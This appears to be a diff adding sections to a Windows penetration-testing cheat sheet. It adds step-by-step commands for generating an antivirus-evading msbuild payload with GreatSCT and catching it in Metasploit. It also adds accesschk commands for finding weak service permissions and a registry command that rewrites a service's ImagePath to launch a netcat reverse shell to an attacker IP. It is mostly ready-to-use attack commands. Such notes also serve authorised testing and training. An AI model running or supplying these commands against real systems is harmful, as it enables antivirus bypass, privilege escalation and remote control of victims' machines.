@@ -108,6 +108,32 @@ C:\Windows\System32\config
 C:\Windows\NTDS
 ```
 
+# AV evasion
+## GreatSCT
+```sh
+# Download
+git clone https://github.com/GreatSCT/GreatSCT.git
+cd GreatSCT/setup/
+./setup.sh
+cd ..
+./GreatSCT.py
+```
+Inside GreatSCT.py
+```sh
+use 1
+list
+use 9
+set lhost <ip>
+sel lport <port>
+generate
+```
+Now start the lister with `msfconsole -r file.rc`` and execute the xml payload with:
+```powershell
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
+```
+
+### References
+- [https://book.hacktricks.xyz/windows-hardening/av-bypass#greatsct](https://book.hacktricks.xyz/windows-hardening/av-bypass#greatsct)
 
 # Privileged groups
 ## AD Recycle Bin
@@ -245,6 +271,45 @@ Add-ObjectAcl -Credential $Cred -TargetIdentity "dc=domain,dc=local" -PrincipalI
 ```bash
 secretsdump.py  dc.local/<user>:<password>@<ipaddress> -outputfile hashes
 ```
+
+# accesschk.exe
+AccessChk is a command-line tool for viewing the effective permissions on files, registry keys, services, processes, kernel objects, and more. This tool will be helpful to identify whether the current user can modify files within a certain service directory.      
+
+**Download from [here](https://github.com/ankh2054/windows-pentest).**  
+```bat
+:: Accept eula
+accesschk.exe /accepteula
+
+:: Access to services
+accesschk.exe <user> -kwsu HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services
+
+:: Services access
+accesschk.exe -uwcqv Users *
+accesschk.exe -uwcqv "Authenticated Users" *
+accesschk.exe -uwcqv "Everyone" *
+
+:: Weak folder permission per drive
+accesschk.exe -uwdqs Users c:\
+accesschk.exe -uwdqs "Authenticated Users" c:\
+accesschk.exe -uwdqs "Everyone" c:\
+```    
+
+## Edit service
+```bat
+:: Get info
+sc query <service>
+reg query HKLM\System\CurrentControlSet\Services\<service>
+
+:: Edit info
+reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\<service>" /t <type> /v <value> /d <data> /f
+
+:: Edit ImagePath and execute netcat command (assuming nc was uploaded before)
+reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\<service>" /t <type> /v ImagePath /d "nc.exe <ip> <port> -e powershell.exe" /f
+```
+
+### References
+- [https://snowscan.io/htb-writeup-control/#](https://snowscan.io/htb-writeup-control/#)
+- [https://steflan-security.com/windows-privilege-escalation-weak-permission/](https://steflan-security.com/windows-privilege-escalation-weak-permission/)
 
 # Config files
 Most config files can be found in `C:\Windows\System32\config`     
